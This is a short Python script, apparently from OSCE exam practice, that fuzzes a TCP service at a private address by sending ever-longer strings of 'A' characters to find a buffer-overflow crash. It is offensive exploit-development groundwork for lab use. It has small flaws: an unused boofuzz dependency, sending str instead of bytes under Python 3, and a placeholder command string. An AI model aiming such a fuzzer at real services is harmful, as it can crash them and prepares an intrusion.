#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This is a template used for fuzzing a process/service for a crash via increasing A's.

References:
- https://epi052.gitlab.io/notes-to-self/blog/2020-05-14-osce-exam-practice-part-two/

Dependencies:
    pip install boofuzz
"""


# Imports
import socket
import sys

ip = "192.168.0.218"
port = 80
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing loaded with %s bytes" % len(string))
        s.send("store/shell/TRUN/etc-string " + string + "\r\n")
        s.recv(1024)
        s.close()

    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
